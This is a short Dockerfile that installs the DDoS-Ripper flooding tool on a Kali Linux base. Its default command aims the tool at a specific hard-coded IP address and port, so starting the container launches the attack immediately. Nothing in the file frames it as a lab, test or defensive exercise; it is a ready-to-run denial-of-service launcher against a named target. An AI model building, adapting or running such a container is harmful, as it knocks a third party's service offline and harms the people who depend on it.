FROM kalilinux/kali-rolling:latest
MAINTAINER PHOENIX UA
RUN apt-get update -y && \
    apt-get install -y python3 && \
    apt-get install -y python3-pip && \
    apt-get install -y  git && \
    git clone https://github.com/palahsu/DDoS-Ripper
WORKDIR /DDoS-Ripper
CMD python3 DRipper.py -s 185.170.2.7 -p 9944  -t 443 

